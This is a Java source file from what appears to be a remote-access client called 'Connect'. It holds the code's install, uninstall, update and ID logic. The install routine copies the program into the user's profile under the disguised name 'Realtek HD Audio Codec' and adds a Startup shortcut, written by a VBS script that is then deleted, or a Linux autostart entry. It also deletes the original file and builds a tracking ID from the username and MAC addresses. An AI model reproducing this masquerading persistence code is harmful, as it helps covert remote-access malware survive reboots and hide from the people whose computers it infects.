package br.com.introcdc.connect.client.components;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:56
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;

import javax.swing.*;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.*;

public class ClientInstallComponents {

    // Updater Variables
    public static final String LOCAL_FILE = "Realtek HD Audio Codec.jar";
    public static final String LOCAL_SHORTCUT = "Realtek HD Audio Codec.lnk";

    public static boolean install() {
        boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
        boolean linux = System.getProperty("os.name").toLowerCase().contains("linux");
        if (!windows && !linux) {
            return false;
        }

        if (Connect.IP.equalsIgnoreCase("127.0.0.1")) {
            try {
                int resposta = JOptionPane.showConfirmDialog(null,
                        "Build do Connect para testes para conectar para o localhost, deseja continuar?", "Conectar?",
                        JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);

                if (resposta != JOptionPane.YES_OPTION) {
                    System.exit(0);
                    return true;
                }
            } catch (Exception ignored) {
            }
        }

        File main = new File(ClientFileComponents.getFileName());
        if (ClientFileComponents.getFileName().isEmpty() || ClientFileComponents.getFileName().equalsIgnoreCase(LOCAL_FILE) || !main.exists()) {
            return false;
        }

        String folder = windows ? (System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\")
                : (System.getProperty("user.home") + "/.config/realtek-audio/");
        String targetPath = folder + LOCAL_FILE;

        File startUp;
        if (windows) {
            startUp = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + LOCAL_SHORTCUT);
        } else {
            startUp = new File(System.getProperty("user.home") + "/.config/autostart/realtek-audio.desktop");
        }
        File objective = new File(targetPath);

        if (objective.exists() && startUp.exists() && objective.length() == main.length()) {
            ClientFileComponents.tempDeleteFile(ClientFileComponents.getFileName());
            runJar(LOCAL_FILE, folder);
            return true;
        }

        new File(folder).mkdirs();
        ClientFileComponents.copy(main, objective);

        if (windows) {
            String script = String.format(
                    "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n" +
                            "Set Shortcut = WshShell.CreateShortcut(\"%s\")\n" +
                            "Shortcut.TargetPath = \"%s\"\n" +
                            "Shortcut.WorkingDirectory = \"%s\"\n" +
                            "Shortcut.Save",
                    startUp.getAbsolutePath().replace("\\", "\\\\"),
                    targetPath.replace("\\", "\\\\"),
                    new File(targetPath).getParent().replace("\\", "\\\\")
            );

            File scriptFile = new File("connect.vbs");
            try (BufferedWriter writer = new BufferedWriter(new FileWriter(scriptFile))) {
                writer.write(script);
            } catch (Exception ignored) {
            }

            try {
                Process process = Runtime.getRuntime().exec("wscript " + scriptFile.getAbsolutePath());
                process.waitFor();
            } catch (Exception ignored) {
            } finally {
                scriptFile.delete();
            }
        } else {
            new File(System.getProperty("user.home") + "/.config/autostart/").mkdirs();
            String desktopFile = "[Desktop Entry]\n" +
                    "Type=Application\n" +
                    "Name=Realtek Audio Codec\n" +
                    "Exec=java -jar \"" + targetPath + "\"\n" +
                    "Terminal=false\n" +
                    "Hidden=false\n";
            try (BufferedWriter writer = new BufferedWriter(new FileWriter(startUp))) {
                writer.write(desktopFile);
            } catch (Exception ignored) {
            }
        }

        ClientFileComponents.tempDeleteFile(ClientFileComponents.getFileName());
        runJar(LOCAL_FILE, folder);
        return true;
    }

    public static void uninstall() {
        boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
        boolean linux = System.getProperty("os.name").toLowerCase().contains("linux");
        if (!windows && !linux) {
            return;
        }
        String startUpPath;
        String path;
        if (windows) {
            startUpPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + LOCAL_SHORTCUT;
            path = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\" + LOCAL_FILE;
        } else {
            startUpPath = System.getProperty("user.home") + "/.config/autostart/realtek-audio.desktop";
            path = System.getProperty("user.home") + "/.config/realtek-audio/" + LOCAL_FILE;
        }
        ClientFileComponents.deleteFile(new File(startUpPath));
        ClientFileComponents.deleteFile(new File(path));
        ClientFileComponents.tempDeleteFile(ClientFileComponents.getFileName());
        if (windows) {
            ClientFileComponents.tempDeleteFile("JNativeHook.x86_64.dll");
        }
    }

    public static String generateUniqueCode() {
        try {
            String userName = System.getProperty("user.name");

            StringBuilder macAddresses = new StringBuilder();
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface network = networkInterfaces.nextElement();
                if (network.isLoopback() || network.isVirtual() || !network.isUp()) {
                    continue;
                }

                byte[] mac = network.getHardwareAddress();
                if (mac != null) {
                    for (byte b : mac) {
                        macAddresses.append(String.format("%02X", b));
                    }
                }
            }

            String combinedData = userName + macAddresses;

            return Base64.getEncoder().encodeToString(combinedData.getBytes());
        } catch (SocketException ignored) {
            return UUID.randomUUID().toString();
        }
    }

    public static void verifyUpdate() {
        ConnectClient.msg("Reiniciando versão atualizada do Connect!");
        runJar("Connect.jar", null, "update");
    }

    public static void update() {
        ClientFileComponents.copy(new File("Connect.jar"), new File(LOCAL_FILE));
        runJar(LOCAL_FILE, null);
    }

    public static void runJar(String jarName, String directory, String... args) {
        try {
            List<String> command = new ArrayList<>();
            command.add("java");
            command.add("-jar");
            command.add(jarName);
            if (args != null) {
                Collections.addAll(command, args);
            }

            ProcessBuilder process = new ProcessBuilder(command);
            if (directory != null) {
                process.directory(new File(directory));
            }
            process.inheritIO();
            process.start();
            System.exit(0);
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao executar o arquivo java " + jarName + " (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

}
